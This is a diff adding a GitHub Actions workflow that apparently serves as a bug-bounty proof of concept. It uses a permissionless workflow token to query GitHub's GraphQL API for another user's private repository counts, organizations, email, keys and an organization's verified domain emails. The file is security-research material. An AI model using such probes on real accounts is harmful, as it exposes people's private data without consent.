@@ -1,0 +1,17 @@
+name: userprobe
+on: workflow_dispatch
+jobs:
+  q:
+    runs-on: ubuntu-latest
+    permissions: {}
+    steps:
+      - env:
+          TK: ${{ github.token }}
+        run: |
+          set +e
+          cat > /tmp/q.json <<'EOF'
+          {"query":"{user(login:\"h1-scyoon\"){ organizations(first:10){totalCount nodes{login}} email name login isViewer repositories(first:5,privacy:PRIVATE){totalCount} repositoriesContributedTo(first:5){totalCount} starredRepositories(first:3){totalCount} watching(first:3){totalCount} followers{totalCount} gists(first:3){totalCount} publicKeys(first:3){totalCount nodes{key}} organizationVerifiedDomainEmails(login:\"f82-poc-org\") }}"}
+          EOF
+          echo "=== BOT (shares nothing with h1-scyoon) ==="
+          curl -s -H "Authorization: bearer $TK" -H "Content-Type: application/json" --data-binary @/tmp/q.json https://api.github.com/graphql
+          echo
